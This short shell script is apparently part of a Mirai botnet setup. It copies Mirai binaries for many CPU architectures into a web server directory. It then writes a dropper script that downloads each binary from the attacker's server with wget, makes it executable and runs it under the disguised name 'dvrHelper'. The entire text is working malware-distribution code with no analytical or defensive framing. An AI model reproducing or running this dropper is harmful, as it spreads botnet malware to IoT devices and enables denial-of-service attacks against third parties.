read -p "Web server ip: " SERVER_IP

mkdir /var/www/html/bins
cp mirai* /var/www/html/bins

echo "#!/bin/sh
 
WEBSERVER=\"$SERVER_IP:80\"
 
 
BINARIES=\"mirai.arm4n mirai.arm5n mirai.arm6n mirai.i586 mirai.i686 mirai.m68k mirai.mips mirai.mpsl mirai.ppc mirai.sh4 mirai.spc mirai.x86 mirai.gnueabihf\"
 
for Binary in \$BINARIES; do
    wget http://\$WEBSERVER/bins/\$Binary -O dvrHelper
    chmod 777 dvrHelper
    ./dvrHelper
done" > /var/www/html/bins/bins.sh